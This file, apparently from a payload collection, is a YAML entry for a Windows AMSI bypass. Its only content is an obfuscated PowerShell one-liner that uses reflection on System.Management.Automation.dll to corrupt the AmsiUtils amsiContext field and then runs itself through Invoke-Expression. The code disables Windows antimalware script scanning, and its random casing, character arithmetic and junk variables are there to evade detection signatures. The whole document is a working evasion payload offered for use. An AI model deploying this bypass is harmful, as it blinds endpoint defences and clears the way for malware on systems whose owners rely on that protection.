@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "amsi-bypass-windows-mattgref02.yaml"
+  tags: ["windows", "evasion"]
+  created: "2026-05-27"
+  authors: ["@s3mme", "@TIVKU", "https://amsi.fail/"]
+
+content: |
+  $gve48aAu="`$GqbWTpKC=[aPPDOMAIN]::cURrEntdOMaIN.gETAssemBlIES()|wHERe-ObjEct{`$_.LOCATION -AND `$_.lOcATiOn.ENDSwITH('System.Management.Automation.dll')};[vOID](gEt-vaRiable -NAME 'dbtt' -ErRorAcTion silENtLYCoNTiNuE);`$qSKpeKp=[sYstEm.REfleCTION.biNDINgFLAgs]'NonPublic,Static';`$GMudjrtZX=`$gQBwTPKc.GettyPEs()|WHEre-oBJect{`$_.naMe -EQ `$([STriNG][cHAR](15+50)+[chAr](109+27-27)+[CHAr](0x22F8 -BXor 0X228b)+[CHAr](16+89)+[cHAr]([byTe]0x55)+[char]([BYte]0x74)+[CHAr](0x3460 -bXOR 0X3409)+[chaR](86+22)+[CHAr]([BYte]0x73))};[voId](gEt-VARiAbLe -name 'h_ls6NCa' -ErRORacTion SileNTLYConTINUE);`$ugONA5=`$gmUDJRTzx.gEtfiElD(`$(('{0}{1}{2}' -f 'am','si','Context')),`$QSkpekp).GeTValUE(`$NUlL);`$_iIDmV='xhUpBDw';[sySTem.RuNTIMe.INTERopsErvIcEs.MaRsHAl]::WriTEINT32(`$UgonA5,0x3df05afC)";INVOkE-EXpresSIOn $gve48aAu
